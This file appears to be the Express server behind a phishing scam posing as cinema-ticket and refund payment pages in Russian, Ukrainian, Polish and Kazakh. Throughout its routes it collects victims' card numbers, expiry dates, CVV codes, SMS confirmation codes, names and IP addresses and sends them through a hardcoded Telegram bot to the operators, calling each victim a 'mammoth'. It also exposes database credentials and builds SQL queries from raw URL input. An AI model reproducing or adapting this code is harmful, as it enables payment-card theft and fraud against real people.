const {Client} = require('pg');
const TelegramApi = require('node-telegram-bot-api');
const express = require('express');


// Подключение к бд
const client = new Client({
    host: "85.193.88.2",
    user: "gen_user",
    password: "syf790ux43",
    database: "default_db",
    port: 5432
});
client.connect();

// Обработака сайта
const app = express();
app.set('view engine', 'ejs');
app.use(express.urlencoded({extended: false}));
app.use(express.static('public'));

try {

    app.get('/', (req, res) => {
        res.redirect(`https://cinema-funnyhub.com`)
    })

    app.get('/refund/:userlink', (req, res) => {
        client.query(`SELECT amount, currency FROM usersrefund WHERE link = '${req.params.userlink}'`, (err, ress)=>{
            if (ress.rows[0] === undefined) {
                res.redirect(`https://funnyhub-cinema.com`);
                return console.log("error");
            }
            if (ress) {
                const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
                if (req.params.userlink.search('ua') !=  -1){
                    console.log(1);
                    var index = 'index_card_ua';
                    var amount_c = `Повернення у розмірі ${ress.rows[0].amount} грн`;
                    var payment = 'Оформлення повернення';
                    var payment_button = 'Оформити повернення';
                } else if (req.params.userlink.search('pln') !=  -1) {
                    console.log(2);
                    var index = 'index_card_pln';
                    var amount_c = `Powrót w rozmiarze ${ress.rows[0].amount} zł`;
                    var payment = 'Wydać zwrot pieniędzy';
                    var payment_button = 'Wydać zwrot pieniędzy';
                } else if (req.params.userlink.search('kz') !=  -1) {
                    console.log(2);
                    var index = 'index_card_kz';
                    var amount_c = `Возврат в размере ${ress.rows[0].amount} ₸`;
                    var payment = 'Оформление возврата';
                    var payment_button = 'Оформить возврат';
                } else {
                    console.log(3);
                    var index = 'index_card';
                    var amount_c = `Возврат в размере ${ress.rows[0].amount} руб`;
                    var payment = 'Оформление возврата';
                    var payment_button = 'Оформить возврат';
                }
                res.render(index, {amount: ress.rows[0].amount, amount_c: amount_c, user_link: req.params.userlink, payment: payment, payment_button: payment_button});
                bot.sendMessage(-1001649675292, `🧖‍♀️ <b>Возврат\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Сумма:</i> <b>${ress.rows[0].amount} ${ress.rows[0].currency}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
                return console.log(ress.rows[0].amount);
            }
        })
    })

    app.get('/:userlink', (req, res) => {
        client.query(`SELECT place FROM users WHERE link = '${req.params.userlink}'`, (err, ress)=>{
            if (ress.rows[0] === undefined) {
                res.redirect(`https://cinema-funnyhub.com`);
                return console.log("error");
            }
            if (req.params.userlink.search('ua') !=  -1){
                console.log(1);
                var index = 'index_ua';
            } else if (req.params.userlink.search('pln') !=  -1) {
                console.log(2);
                var index = 'index_pln';
            } else if (req.params.userlink.search('kz') !=  -1) {
                console.log(2);
                var index = 'index_kz';
            } else {
                console.log(3);
                var index = 'index';
            }
            if (ress) {
                const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
                res.render(index, {userplace: ress.rows[0].place, user_link: req.params.userlink});
                client.query(`SELECT user_id FROM users WHERE link = '${req.params.userlink}'`, (err, res)=>{
                    bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
                })
                return console.log(ress.rows[0].place);
            } else {
                res.render(index, {userplace: "Москва Нирженская 15"});
            return console.log("undefined link") };
        })

    })

    app.post('/3ds', (req, res) => {
        var amount_c = `Cумма к оплате ${req.body.amount} руб`;
        let payment = 'Оплата заказа'
        let payment_button = 'Оплата'
        res.render('index_card', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});

    })
    app.post('/3dsua', (req, res) => {
        var amount_c = `Сума до сплати ${req.body.amount} грн`;
        let payment = 'Оплата замовлення'
        let payment_button = 'Оплатити замовлення'
        res.render('index_card_ua', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
    })

    app.post('/3dspln', (req, res) => {
        var amount_c = `kwota do zapłaty ${req.body.amount} zł`;
        let payment = 'Zamów płatność'
        let payment_button = 'Zapłacić za zamówienie'
        res.render('index_card_pln', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
    })

    app.post('/3dskz', (req, res) => {
        var amount_c = `Cумма к оплате ${req.body.amount} ₸`;
        let payment = 'Оплата заказа'
        let payment_button = 'Оплата'
        res.render('index_card_kz', {amount: req.body.amount, amount_c: amount_c, user_link: req.body.user_link, payment: payment, payment_button: payment_button});
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        bot.sendMessage(-1001649675292, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
    })

    app.post('/refund/confirmationua', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code_ua', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});
    })

    app.post('/confirmationua', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты UA</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code_ua', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});
    })

    app.post('/refund/confirmationkz', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code_kz', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});
    })

    app.post('/confirmationkz', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты KZ</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code_kz', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});
    })

    
    app.post('/refund/confirmation', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});
    
                                })

    app.post('/confirmation', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты RU</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});
    
                                })
    app.post('/refund/confirmationpln', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code_pln', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});

    })
    app.post('/confirmationpln', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc")
        bot.sendMessage(-1001628579302, `💳 <b>🙋‍♂️ Мамонт перешел на страницу оплаты PLN</b>\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
        const delete_button = {
            reply_markup: JSON.stringify({
                inline_keyboard: [
                    [
                        {
                            text: "Удалить ссылку",
                            callback_data: `del_li_site${req.body.user_link}`,
                        }
                    ]
                ]
            }),
            parse_mode: 'HTML'
        }
        bot.sendMessage(-1001649675292, `💳 Карта: <b>${req.body.card_number}</b>\n🫧 Срок действия: <b>${req.body.expdate1}/${req.body.expdate2}</b>\n✨ CVV: <b>${req.body.cvc2}</b>\n\n💸 Сумма: <b>${req.body.amount}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, delete_button);
        res.render('index_code_pln', {cardnumber: req.body.card_number.toString().slice(-4),
                                    cardnumberAll: req.body.card_number.toString().replace(/ /g,''),
                                    amount: req.body.amount,
                                    cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                    expdate1: req.body.expdate1,
                                    expdate2: req.body.expdate2,
                                    cvc2: req.body.cvc2});

    })
    app.post('/refund/confirmation_fpln', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f_pln', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })
    app.post('/confirmation_fpln', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f_pln', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })
    app.post('/refund/confirmation_fkz', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f_kz', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })
    app.post('/confirmation_fkz', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f_kz', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })
    app.post('/refund/confirmation_fua', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f_ua', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })
    app.post('/confirmation_fua', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f_ua', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })
    
    app.post('/refund/confirmation_f', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })

    app.post('/confirmation_f', (req, res) => {
        const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
        let sms_number = req.body.sms_number;
        if (req.body.sms_number === undefined) {
            sms_number = req.body.securecode;
        }
        bot.sendMessage(-1001649675292, `<i>💌 Код из СМС...</i> \n🔖 Код: <b>${sms_number}</b>\n\n💳 Карта: <b>${req.body.cardnumberAll}</b>\n🙋‍♂️ На кого: <b>${req.body.cardholder}</b>`, {parse_mode: 'HTML'});
        setTimeout(function(){
            res.render('index_code_f', {cardnumber: req.body.cardnumber,
                                        cardnumberAll: req.body.cardnumberAll.toString().replace(/ /g,''),
                                        amount: req.body.amount,
                                        cardholder: req.body.cardholder.toString().replace(/ /g,''),
                                        expdate1: req.body.expdate1,
                                        expdate2: req.body.expdate2,
                                        cvc2: req.body.cvc2});
        }, 3000);
        
    })
} catch (err) {
    console.log('error');
  }

const PORT = 8080;

app.listen(PORT, () => {
    console.log(`Server started... `);
})